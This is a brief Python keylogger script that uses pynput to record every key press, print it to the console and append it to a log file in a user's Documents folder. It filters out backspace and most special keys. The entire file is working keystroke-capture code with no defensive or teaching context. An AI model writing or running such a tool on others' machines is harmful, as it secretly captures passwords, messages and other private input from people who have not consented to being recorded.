from pynput.keyboard import Listener

count = 0
keys = []
state = 0
def on_press(key):
    global keys,count
    keys.append(key)
    count +=1
    print(key)
    write_file(keys)
    keys = []

def write_file(keys):
    global state
    with open("C:\\Users\\chand\\Documents\\log.txt", "a") as f:
        for key in keys:
            if state==0:
                state=1
                f.write("\n")
            k = str(key).replace("'","")
            if k.find("backspace") > 0:
                continue
            elif k.find("space") > 0:
                f.write("  ")
            elif k.find("Key") > 0:
                f.write("")
            elif k.find("Key") == -1:
                f.write(k)

with Listener(on_press=on_press) as listener:
    listener.join()

